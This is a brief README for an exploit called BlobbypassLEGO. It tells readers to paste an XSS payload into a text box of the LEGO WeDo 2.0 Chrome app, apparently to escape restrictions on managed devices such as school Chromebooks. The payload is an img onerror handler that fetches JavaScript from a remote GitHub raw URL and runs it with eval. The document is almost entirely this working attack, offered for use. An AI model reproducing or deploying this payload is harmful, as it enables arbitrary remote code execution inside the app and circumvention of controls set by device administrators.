# BlobbypassLEGO
## LEGO WeDo 2.0 Webview Exploit that uses BlobbypassXSS

### How to use:
* First, install [WeDo 2.0 LEGO® Education](https://chromewebstore.google.com/detail/wedo-20-lego%C2%AE-education/pflionopdgpjckjkafnlamfmonjhccdh?hl=en-US) from the Chrome Webstore.
* Then, create a new project.
* Once you are in the project, click on the pencil in the top bar.
* Then, click the green document button.
* In the textbox, paste the following string:
```
<img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>
```
* That's it!
  
#### This does not bypass Wi-Fi restrictions. If you want to do that, do [Blobwifi](https://blobby-boi.github.io/Blobwifi/).
